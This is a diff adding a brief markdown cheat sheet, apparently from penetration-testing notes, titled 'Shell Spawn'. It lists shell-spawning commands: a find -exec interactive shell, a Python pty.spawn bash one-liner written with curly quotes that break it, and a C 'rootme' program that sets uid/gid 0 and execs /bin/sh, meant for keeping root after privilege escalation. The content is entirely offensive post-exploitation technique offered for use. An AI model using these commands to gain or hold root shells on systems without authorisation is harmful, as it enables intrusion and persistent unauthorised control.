@@ -1,0 +1,12 @@
+# Shell Spawn
+
+## Commands
+
+`$ find . -exec sh -i \;`
+`$ python -c ‘import pty;pty.spawn(“/bin/bash”);’`
+
+## Programs
+
+### C
+
+`$ echo "int main(void){setgid(0);setuid(0);execl(\"/bin/sh\",\"sh\",0);}" > rootme.c && gcc rootme.c -o rootme`
